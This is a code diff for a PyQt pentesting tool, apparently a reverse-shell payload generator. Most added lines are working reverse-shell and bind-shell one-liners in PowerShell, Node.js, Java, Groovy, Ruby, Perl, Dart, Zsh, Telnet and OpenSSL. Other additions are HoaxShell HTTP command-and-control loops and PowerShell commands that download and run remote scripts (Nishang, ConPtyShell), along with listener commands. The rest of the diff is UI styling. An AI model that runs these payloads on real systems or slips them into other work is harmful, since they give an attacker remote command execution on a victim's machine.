@@ -23,7 +23,9 @@ from ui.styles import (
     # Behaviors
     SafeStop, OutputHelper,
     # Constants
-    COLOR_BG_SECONDARY
+    COLOR_BG_SECONDARY, COLOR_BG_INPUT, COLOR_BORDER_DEFAULT, 
+    COLOR_TEXT_PRIMARY, COLOR_ACCENT_PRIMARY, COLOR_BG_ELEVATED,
+    COLOR_ACCENT_HOVER, COLOR_TEXT_MUTED
 )
 from core.fileops import RESULT_BASE
 
@@ -66,12 +68,31 @@ REVERSE = [
     {"name":"Golang","cmd":"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go","os":"all"},
     {"name":"Awk","cmd":"awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null","os":"linux"},
     {"name":"Lua #1","cmd":"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"","os":"linux"},
+    {"name":"PowerShell #1 (TCP)","cmd":"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","os":"windows"},
+    {"name":"PowerShell #2 (Nishang)","cmd":"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}","os":"windows"},
+    {"name":"PowerShell #3 (ConPty)","cmd":"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}","os":"windows"},
+    {"name":"PowerShell #4 (Base64)","cmd":"$t='{ip}:{port}';$c=New-Object System.Net.Sockets.TCPClient;$c.Connect($t.Split(':')[0],$t.Split(':')[1]);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object System.Text.UTF8Encoding).GetString($b,0,$i);$z=(iex $d 2>&1 | Out-String);$y=$z + 'PS ' + (pwd).Path + '> ';$x=([text.encoding]::UTF8).GetBytes($y);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()","os":"windows"},
+    {"name":"Node.js","cmd":"(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('{shell}',[]);var client=new net.Socket();client.connect({port},'{ip}',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();","os":"linux"},
+    {"name":"Node.js (IIFE)","cmd":"require('child_process').exec('nc -e {shell} {ip} {port}')","os":"linux"},
+    {"name":"Java #1","cmd":"r = Runtime.getRuntime(); p = r.exec([\"{shell}\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()","os":"linux"},
+    {"name":"Java #2","cmd":"String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);};p.destroy();s.close();","os":"linux"},
+    {"name":"Groovy","cmd":"String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);};p.destroy();s.close();","os":"linux"},
+    {"name":"Telnet","cmd":"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF","os":"linux"},
+    {"name":"OpenSSL","cmd":"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s","os":"linux"},
+    {"name":"Ruby #2","cmd":"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'","os":"linux"},
+    {"name":"Ruby no-sh","cmd":"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'","os":"linux"},
+    {"name":"Perl no-sh","cmd":"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'","os":"linux"},
+    {"name":"Dart","cmd":"import 'dart:io';import 'dart:convert';main() {Socket.connect('{ip}', {port}).then((socket) {socket.listen((data) {Process.start('{shell}', []).then((Process process) {process.stdin.add(data);process.stdout.pipe(socket);process.stderr.pipe(socket);});}, onDone: () {socket.destroy();});});}","os":"linux"},
+    {"name":"Zsh","cmd":"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'","os":"linux"},
 ]
 
 BIND = [
     {"name":"Python3 Bind","cmd":"python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'","os":"all"},
     {"name":"PHP Bind","cmd":"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'","os":"all"},
     {"name":"nc Bind","cmd":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f","os":"linux"},
+    {"name":"Perl Bind","cmd":"perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"{shell} -i\");};'","os":"linux"},
+    {"name":"Ruby Bind","cmd":"ruby -rsocket -e 'f=TCPServer.new({port});c=f.accept;c.print \"Shape$\\n\";while(l=c.gets);IO.popen(l,\"r\"){|io|c.print io.read};end'","os":"linux"},
+    {"name":"Ncat Bind","cmd":"ncat --listen -p {port} -e {shell}","os":"linux"},
 ]
 
 MSFVENOM = [
@@ -86,6 +107,8 @@ MSFVENOM = [
 
 HOAXSHELL = [
     {"name":"Windows CMD cURL","cmd":"@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL","os":"windows"},
+    {"name":"PowerShell IEX","cmd":"$s='{ip}:{port}';$i='eb6a44aa-8acc1e56-629ea455';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eb6a44aa -Headers @{Authorization=$i};while($true){$c=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8acc1e56 -Headers @{Authorization=$i};if($c.Content -ne 'None'){$r=iex $c.Content 2>&1 | Out-String;Invoke-WebRequest -UseBasicParsing -Uri $p$s/629ea455 -Headers @{Authorization=$i} -Method POST -Body $r}sleep 1}","os":"windows"},
+    {"name":"PowerShell Outfile","cmd":"$s='{ip}:{port}';$i='eb6a44aa-8acc1e56-629ea455';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eb6a44aa -Headers @{Authorization=$i};while($true){$c=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8acc1e56 -Headers @{Authorization=$i};if($c.Content -ne 'None'){$c.Content | Out-File .\\c.ps1; $r=powershell .\\c.ps1 2>&1 | Out-String;Invoke-WebRequest -UseBasicParsing -Uri $p$s/629ea455 -Headers @{Authorization=$i} -Method POST -Body $r}sleep 1}","os":"windows"},
 ]
 
 LISTENERS = [
@@ -97,6 +120,8 @@ LISTENERS = [
     ("socat", "socat -d -d TCP-LISTEN:{port} STDOUT"),
     ("pwncat", "python3 -m pwncat -lp {port}"),
     ("msfconsole", "msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\""),
+    ("powercat", "powercat -l -p {port}"),
+    ("hoaxshell", "python3 hoaxshell.py -s {ip}"),
 ]
 
 CATEGORIES = [("🔴 Reverse", REVERSE), ("⚫ Bind", BIND), ("🟢 MSFVenom", MSFVENOM), ("🟡 HoaxShell", HOAXSHELL)]
@@ -163,7 +188,7 @@ class ShellForgeView(StyledToolView, SafeStop, OutputHelper):
         self.ip_input.textChanged.connect(self._update_cmd)
         conn_layout.addWidget(self.ip_input, 1)
         
-        detect_btn = BrowseButton("📍Detect")
+        detect_btn = RunButton("Detect")
         detect_btn.clicked.connect(self._detect_ip)
         conn_layout.addWidget(detect_btn)
         
@@ -201,7 +226,7 @@ class ShellForgeView(StyledToolView, SafeStop, OutputHelper):
         for i, (n, c) in enumerate([("All", ""), ("Linux", "linux"), ("Windows", "windows"), ("Mac", "mac")]):
             r = QRadioButton(n)
             # Styling radio buttons explicitly since they are tricky
-            r.setStyleSheet("QRadioButton { color: #e5e7eb; } QRadioButton::indicator:checked { background-color: #f97316; }")
+            r.setStyleSheet(f"QRadioButton {{ color: {COLOR_TEXT_PRIMARY}; }} QRadioButton::indicator:checked {{ background-color: {COLOR_ACCENT_PRIMARY}; }}")
             if i == 0: r.setChecked(True)
             self.os_group.addButton(r, i)
             os_layout.addWidget(r)
@@ -210,7 +235,7 @@ class ShellForgeView(StyledToolView, SafeStop, OutputHelper):
         self.os_group.idClicked.connect(lambda: self._update_shell_list())
 
         # Search
-        self.search_input = StyledLineEdit()
+        self.search_input = StyledLineEdit(show_icon=True)
         self.search_input.setPlaceholderText("Filter payloads...")
         self.search_input.textChanged.connect(self._update_shell_list)
         
@@ -224,10 +249,59 @@ class ShellForgeView(StyledToolView, SafeStop, OutputHelper):
         
         # Shell List
         self.shell_list = QListWidget()
-        self.shell_list.setStyleSheet(f"background-color: #1E1E2E; border: 1px solid #333; color: white;")
+        self.shell_list.setStyleSheet(f"""
+            QListWidget {{
+                background-color: {COLOR_BG_INPUT};
+                border: 1px solid {COLOR_BORDER_DEFAULT};
+                color: {COLOR_TEXT_PRIMARY};
+                border-radius: 4px;
+                padding: 4px;
+                outline: none;
+            }}
+            QListWidget::item {{
+                padding: 8px;
+                border-radius: 4px;
+                margin-bottom: 2px;
+            }}
+            QListWidget::item:selected {{
+                background-color: {COLOR_ACCENT_PRIMARY};
+                color: {COLOR_TEXT_PRIMARY};
+                border: 1px solid {COLOR_ACCENT_HOVER}; /* Glow effect selection */
+                outline: none;
+            }}
+            QListWidget::item:hover:!selected {{
+                background-color: {COLOR_BG_ELEVATED};
+                border: 1px solid {COLOR_TEXT_MUTED}; /* Glow effect hover */
+            }}
+        """)
         self.shell_list.currentRowChanged.connect(self._update_cmd)
         control_layout.addWidget(self.shell_list)
         
+        # Listener Section (Moved below list)
+        control_layout.addSpacing(10)
+        control_layout.addWidget(StyledLabel("Listener Command:"))
+        
+        lis_layout = QHBoxLayout()
+        self.lis_combo = StyledComboBox()
+        self.lis_combo.setMaxVisibleItems(10)
+        self.lis_combo.setStyleSheet("QComboBox { combobox-popup: 0; }") 
+        for n, _ in LISTENERS:
+            self.lis_combo.addItem(n)
+        self.lis_combo.currentTextChanged.connect(self._update_lis)
+        lis_layout.addWidget(self.lis_combo, 1)
+        
+        copy_lis_btn = RunButton("📋")
+        copy_lis_btn.setToolTip("Copy Listener")
+        copy_lis_btn.clicked.connect(self._copy_listener)
+        copy_lis_btn.setFixedWidth(40) 
+        lis_layout.addWidget(copy_lis_btn)
+        
+        control_layout.addLayout(lis_layout)
+        
+        self.listener_output = StyledLineEdit()
+        self.listener_output.setReadOnly(True)
+        control_layout.addWidget(self.listener_output)
+
         control_layout.addStretch()
         splitter.addWidget(control_panel)
         
@@ -252,33 +326,13 @@ class ShellForgeView(StyledToolView, SafeStop, OutputHelper):
         copy_btn.clicked.connect(self._copy_payload)
         enc_layout.addWidget(copy_btn)
         
-        save_btn = BrowseButton("💾 Save to File") 
+        save_btn = RunButton("💾 Save to File") 
         save_btn.clicked.connect(self._save_payload)
         enc_layout.addWidget(save_btn)
         
         output_layout.addLayout(enc_layout)
         
-        output_layout.addSpacing(20)
-        
-        # Listener Output
-        output_layout.addWidget(HeaderLabel("LISTENER", "Command"))
-        
-        lis_layout = QHBoxLayout()
-        self.lis_combo = StyledComboBox()
-        for n, _ in LISTENERS:
-            self.lis_combo.addItem(n)
-        self.lis_combo.currentTextChanged.connect(self._update_lis)
-        lis_layout.addWidget(self.lis_combo)
-        
-        copy_lis_btn = RunButton("📋 Copy Listener")
-        copy_lis_btn.clicked.connect(self._copy_listener)
-        lis_layout.addWidget(copy_lis_btn)
-        
-        output_layout.addLayout(lis_layout)
-        
-        self.listener_output = StyledLineEdit()
-        self.listener_output.setReadOnly(True)
-        output_layout.addWidget(self.listener_output)
+        output_layout.addStretch()
         
         splitter.addWidget(output_panel)
         splitter.setSizes([400, 450])
@@ -347,7 +401,7 @@ class ShellForgeView(StyledToolView, SafeStop, OutputHelper):
     def _update_cmd(self):
         raw = self._get_raw_cmd()
         self.payload_output.clear()
-        self.payload_output.append(raw) # Display raw first
+        self.payload_output.appendPlainText(raw) # Display raw first
         self._update_lis()
 
     def _update_lis(self):
